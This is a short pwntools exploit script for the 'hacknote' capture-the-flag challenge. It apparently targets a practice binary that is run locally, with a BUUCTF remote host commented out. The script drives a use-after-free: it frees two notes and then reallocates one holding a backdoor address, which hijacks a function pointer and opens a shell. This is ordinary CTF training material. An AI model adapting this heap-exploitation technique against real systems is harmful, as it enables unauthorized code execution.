from pwn import *
context(log_level='debug',os='linux',arch='x86',terminal=['tmux','splitw','-h'])


io=process("./hacknote")
# io=remote("node4.buuoj.cn",25546)
back_door=0x8048945

def add(n,st):
    io.recvuntil(b"choice :")
    io.sendline(b"1")
    io.recvuntil(b"size :")
    io.sendline(str(n))
    io.recvuntil(b"Content :")
    io.send(st)

def delete(n):
    io.recvuntil(b"choice :")
    io.sendline(b"2")
    io.recvuntil(b"Index :")
    io.sendline(str(n))

def printw(n):
    io.recvuntil(b"choice :")
    io.sendline(b"3")
    io.recvuntil(b"Index :")
    io.sendline(str(n))

add(24,cyclic(0x18))
add(24,cyclic(0x18))
delete(0)
delete(1)
gdb.attach(io)
pause()
add(8,p32(back_door))
printw(0)

io.interactive()
